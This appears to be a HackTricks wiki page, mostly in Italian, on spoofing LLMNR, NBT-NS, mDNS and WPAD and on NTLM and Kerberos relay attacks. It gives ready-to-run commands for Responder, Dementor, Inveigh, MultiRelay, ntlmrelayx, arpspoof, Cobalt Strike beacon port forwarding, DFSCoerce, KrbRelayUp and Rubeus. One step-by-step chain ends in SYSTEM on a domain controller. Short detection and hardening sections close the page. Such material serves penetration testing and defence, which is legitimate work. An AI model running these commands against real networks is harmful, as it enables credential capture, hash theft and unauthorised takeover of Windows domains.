# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Network Protocols

### Local Host Resolution Protocols

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft e altri sistemi operativi usano LLMNR e NBT-NS per la risoluzione dei nomi locali quando DNS fallisce. Allo stesso modo, Apple e Linux usano mDNS.
- Questi protocolli sono suscettibili a intercettazione e spoofing a causa della loro natura non autenticata e broadcast su UDP.
- [Responder](https://github.com/lgandx/Responder) e [Dementor](https://github.com/MatrixEditor/Dementor) possono essere usati per impersonare servizi inviando risposte forgiate agli host che interrogano questi protocolli.
- Ulteriori informazioni sull'impersonificazione di servizi usando Responder possono essere trovate [here](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD permette ai browser di scoprire automaticamente le impostazioni del proxy.
- La discovery è facilitata via DHCP, DNS, o fallback a LLMNR e NBT-NS se DNS fallisce.
- Responder può automatizzare gli attacchi WPAD, indirizzando i client a WPAD server malevoli.

### Responder/Dementor for Protocol Poisoning

- **Responder** è uno strumento usato per avvelenare (poisoning) le query LLMNR, NBT-NS e mDNS, rispondendo selettivamente in base ai tipi di query, puntando principalmente ai servizi SMB.
- Viene fornito pre-installato in Kali Linux, configurabile in `/etc/responder/Responder.conf`.
- Responder mostra gli hashes catturati sullo schermo e li salva nella directory `/usr/share/responder/logs`.
- Supporta sia IPv4 che IPv6.
- La versione per Windows di Responder è disponibile [here](https://github.com/lgandx/Responder-Windows).

- **Dementor** amplia i temi del multicast poisoning e agisce inoltre come rogue service provider (incluso supporto CUPS RCE)
- La struttura generale è simile a **Responder** con una configurazione più granulare. (default è qui: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- La compatibilità tra **Dementor** e **Responder** è riportata qui: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Intro e Documentazione qui: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Risolve problemi di cattura introdotti da Responder su certi protocolli

#### Running Responder

- To run Responder with default settings: `responder -I <Interface>`
- For more aggressive probing (with potential side effects): `responder -I <Interface> -P -r -v`
- Techniques to capture NTLMv1 challenges/responses for easier cracking: `responder -I <Interface> --lm --disable-ess`
- WPAD impersonation can be activated with: `responder -I <Interface> --wpad`
- NetBIOS requests can be resolved to the attacker's IP, and an authentication proxy can be set up: `responder.py -I <interface> -Pv`

#### Running Dementor

- Con le impostazioni predefinite applicate: `Dementor -I <interface>`
- Con le impostazioni predefinite in modalità analisi: `Dementor -I <interface> -A`
- Downgrade automatico di NTLM session (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- Eseguire la sessione corrente con config custom: `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning with Responder

- Spoofing delle risposte DHCP può avvelenare permanentemente le informazioni di routing di una vittima, offrendo un'alternativa più stealth rispetto all'ARP poisoning.
- Richiede la conoscenza precisa della configurazione della rete target.
- Esecuzione dell'attacco: `./Responder.py -I eth0 -Pdv`
- Questo metodo può catturare efficacemente NTLMv1/2 hashes, ma richiede attenzione per evitare disruption della rete.

### Capturing Credentials with Responder/Dementor

- Responder/Dementor impersoneranno i servizi usando i protocolli sopra menzionati, catturando credenziali (di solito NTLMv2 Challenge/Response) quando un utente tenta di autenticarsi contro i servizi spoofati.
- Si possono tentare downgrade a NetNTLMv1 o disabilitare ESS per facilitare il cracking delle credenziali.

È cruciale notare che l'uso di queste tecniche deve essere fatto in modo legale ed etico, assicurando la dovuta autorizzazione ed evitando disruption o accessi non autorizzati.

## Inveigh

Inveigh è uno strumento per penetration testers e red teamers, progettato per sistemi Windows. Offre funzionalità simili a Responder, eseguendo spoofing e attacchi man-in-the-middle. Lo strumento è evoluto da uno script PowerShell a un binario C#, con [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) e [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) come versioni principali. Parametri dettagliati e istruzioni sono disponibili nella [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh può essere operato tramite PowerShell:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Oppure eseguito come binario C#:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Questo attacco sfrutta sessioni di autenticazione SMB per ottenere accesso a una macchina target, concedendo una shell di sistema se ha successo. I prerequisiti principali includono:

- L'utente autenticante deve avere accesso Local Admin sull'host verso cui viene rilanciata la connessione.
- SMB signing dovrebbe essere disabilitato.

#### 445 Port Forwarding and Tunneling

In scenari in cui un'introduzione diretta nella rete non è praticabile, il traffico sulla porta 445 deve essere inoltrato e tunnelizzato. Strumenti come [**PortBender**](https://github.com/praetorian-inc/PortBender) aiutano a reindirizzare il traffico sulla porta 445 verso un'altra porta, cosa essenziale quando è disponibile accesso Local Admin per il caricamento di driver.

PortBender setup and operation in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Altri strumenti per NTLM Relay Attack

- **Metasploit**: Configurare con proxies, dettagli dell'host locale e remoto.
- **smbrelayx**: Uno script Python per il relay di sessioni SMB, l'esecuzione di comandi o il deploy di backdoors.
- **MultiRelay**: Uno strumento della Responder suite per il relay di utenti specifici o di tutti gli utenti, l'esecuzione di comandi o il dump di hashes.

Ogni strumento può essere configurato per operare attraverso un SOCKS proxy se necessario, permettendo attacchi anche con accesso di rete indiretto.

### Funzionamento di MultiRelay

MultiRelay viene eseguito dalla directory _**/usr/share/responder/tools**_, mirato a IP specifici o utenti.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Questi strumenti e tecniche costituiscono un set completo per eseguire NTLM Relay in vari ambienti di rete.

### Abuso di WSUS HTTP (8530) per NTLM Relay verso LDAP/SMB/AD CS (ESC8)

I client WSUS si autenticano al loro server di aggiornamenti usando NTLM su HTTP (8530) o HTTPS (8531). Quando HTTP è abilitato, i check-in periodici dei client possono essere forzati o intercettati sul segmento locale e relay-ati con ntlmrelayx verso endpoint LDAP/LDAPS/SMB o AD CS HTTP (ESC8) senza crackare alcun hash. Questo si mescola al normale traffico di aggiornamento e frequentemente restituisce autenticazioni di account macchina (HOST$).

Cosa cercare
- GPO/registry configuration under HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate and ...\WindowsUpdate\AU:
- WUServer (e.g., http://wsus.domain.local:8530)
- WUStatusServer (reporting URL)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled and DetectionFrequency (hours)
- WSUS SOAP endpoints used by clients over HTTP:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Porte predefinite: 8530/tcp HTTP, 8531/tcp HTTPS

Reconnaissance
- Unauthenticated
- Scan for listeners: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Sniff HTTP WSUS traffic via L2 MITM and log active clients/endpoints with wsusniff.py (HTTP only unless you can make clients trust your TLS cert).
- Authenticated
- Parse SYSVOL GPOs for WSUS keys with MANSPIDER + regpol (wsuspider.sh wrapper summarises WUServer/WUStatusServer/UseWUServer).
- Query endpoints at scale from hosts (NetExec) or locally:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

Passaggi end-to-end per il relay HTTP
1) Posizionarsi per un MITM (stesso L2) in modo che un client risolva il server WSUS verso di voi (ARP/DNS poisoning, Bettercap, mitm6, ecc.). Esempio con arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Reindirizzare la porta 8530 al vostro listener di relay (opzionale, comodo):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Avviare ntlmrelayx con l'HTTP listener (richiede il supporto Impacket per l'HTTP listener; vedi PRs sotto):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Altri obiettivi comuni:
- Relay to SMB (if signing off) for exec/dump: -t smb://<host>
- Relay to LDAPS for directory changes (e.g., RBCD): -t ldaps://<DC>
- Relay to AD CS web enrollment (ESC8) to mint a cert and then authenticate via Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
For deeper AD CS abuse paths and tooling, see the AD CS page:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Forzare un check-in del client o aspettare lo schedule. Da un client:
wuauclt.exe /detectnow
or use the Windows Update UI (Check for updates).

5) Usare le sessioni SOCKS autenticate (if -socks) o i risultati del relay diretto per post-exploitation (LDAP changes, SMB ops, or AD CS certificate issuance for later authentication).

HTTPS constraint (8531)
- Passive interception of WSUS over HTTPS is ineffective unless clients trust your certificate. Without a trusted cert or other TLS break, the NTLM handshake can’t be harvested/relayed from WSUS HTTPS traffic.

Note
- WSUS è stato dichiarato deprecato ma rimane ampiamente distribuito; HTTP (8530) è ancora comune in molti ambienti.
- Useful helpers: wsusniff.py (observe HTTP WSUS check-ins), wsuspider.sh (enumerate WUServer/WUStatusServer from GPOs), NetExec reg-query at scale.
- Impacket restored HTTP listener support for ntlmrelayx in PR #2034 (originally added in PR #913).

### Force NTLM Logins

In Windows you **may be able to force some privileged accounts to authenticate to arbitrary machines**. Read the following page to learn how:


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

A **Kerberos relay attack** steals an **AP-REQ ticket** from one service and re-uses it against a second service that shares the **same computer-account key** (because both SPNs sit on the same `$` machine account). This works even though the SPNs’ **service classes differ** (e.g. `CIFS/` → `LDAP/`) because the *key* that decrypts the ticket is the machine’s NT hash, not the SPN string itself and the SPN string is not part of the signature.

Unlike NTLM relay, the hop is limited to the *same host* but, if you target a protocol that lets you write to LDAP, you can chain into **Resource-Based Constrained Delegation (RBCD)** or **AD CS enrollment** and pop **NT AUTHORITY\SYSTEM** in a single shot.

For detailed info about this attack check:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Kerberos basics**

| Token | Scopo | Rilevanza per il relay |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | Proves the user to the KDC | untouched |
| **Service ticket / TGS-REQ ↔ REP** | Bound to one **SPN**; encrypted with the SPN owner’s key | interchangeable if SPNs share account |
| **AP-REQ** | Client sends `TGS` to the service | **what we steal & replay** |

* I ticket sono encryptati con la **password-derived key dell'account che possiede lo SPN**.
* L'**Authenticator** dentro l'AP-REQ ha un timestamp di 5 minuti; il replay dentro quella finestra è valido finché la cache del servizio non vede un duplicato.
* Windows raramente verifica se la stringa SPN nel ticket corrisponde al servizio che stai colpendo, quindi un ticket per `CIFS/HOST` normalmente si decripta correttamente su `LDAP/HOST`.

- 2. **What must be true to relay Kerberos**

1. **Shared key:** source and target SPNs belong to the same computer account (default on Windows servers).
2. **No channel protection:** SMB/LDAP signing off and EPA off for HTTP/LDAPS.
3. **You can intercept or coerce authentication:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, etc..
4. **Ticket source not already used:** you win the race before the real packet hits or block it entirely; otherwise the server’s replay cache fires Event 4649.
5. You need to somehow be able to perform a **MitM in the communication** maybe being part of the DNSAmins group to modify the DNS of the domain or being able to change the HOST file of the victim.

### Kerberos Relay Steps

- 3.1 **Recon the host**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Avvia il relay listener**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` incapsula **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** in un unico binario.

- 3.3 **Coerce Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce fa sì che il DC ci invii un ticket Kerberos `CIFS/DC01`.

- 3.4 **Inoltra l'AP-REQ**

KrbRelay estrae il GSS blob da SMB, lo reimpacchetta in un LDAP bind e lo inoltra a `ldap://DC01`—l'autenticazione riesce perché la **stessa chiave** lo decifra.

- 3.5 **Abusa di LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Ora possiedi **NT AUTHORITY\SYSTEM**.


### **Altri percorsi da conoscere**

| Vector | Trick | Why it matters |
|--------|-------|----------------|
| **AuthIP / IPSec** | Server falso invia un **GSS-ID payload** con qualsiasi SPN; il client costruisce un AP-REQ diretto verso di te | Funziona anche tra subnet; machine creds di default |
| **DCOM / MSRPC** | Malicious OXID resolver costringe il client ad autenticarsi a uno SPN e porta arbitrari | Puro *local* priv-esc; aggira il firewall |
| **AD CS Web Enroll** | Relay del ticket della macchina a `HTTP/CA` e ottenere un cert, poi **PKINIT** per generare TGTs | Ignora le difese LDAP signing |
| **Shadow Credentials** | Scrivi `msDS-KeyCredentialLink`, poi PKINIT con coppia di chiavi falsificata | Non è necessario aggiungere un computer account |

### **Risoluzione dei problemi**

| Errore | Significato | Soluzione |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | La chiave del ticket ≠ chiave del target | Host/SPN errato |
| `KRB_AP_ERR_SKEW` | Orologio > 5 min di scarto | Sincronizza l'ora o usa `w32tm` |
| LDAP bind fails | Signing forzato | Usa il percorso AD CS o disabilita il signing |
| Event 4649 spam | Il servizio ha visto un Authenticator duplicato | Bloccare o tentare una race contro il pacchetto originale |


### **Rilevamento**

* Aumento di **Event 4769** per `CIFS/`, `HTTP/`, `LDAP/` dalla stessa sorgente in pochi secondi.
* **Event 4649** sul servizio indica replay rilevato.
* Accesso Kerberos da **127.0.0.1** (relay to local SCM) è altamente sospetto—mappare tramite regola Sigma nei documenti KrbRelayUp.
* Monitorare cambiamenti agli attributi `msDS-AllowedToActOnBehalfOfOtherIdentity` o `msDS-KeyCredentialLink`.

## **Rafforzamento**

1. Applicare **LDAP & SMB signing + EPA** su ogni server.
2. **Split SPNs** in modo che HTTP non sia sullo stesso account di CIFS/LDAP.
3. Applicare patch ai vettori di coercizione (PetitPotam KB5005413, DFS, AuthIP).
4. Impostare **`ms-DS-MachineAccountQuota = 0`** per impedire join di computer non autorizzati.
5. Allertare per **Event 4649** e accessi Kerberos loopback inattesi.



## References

- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)

{{#include ../../banners/hacktricks-training.md}}
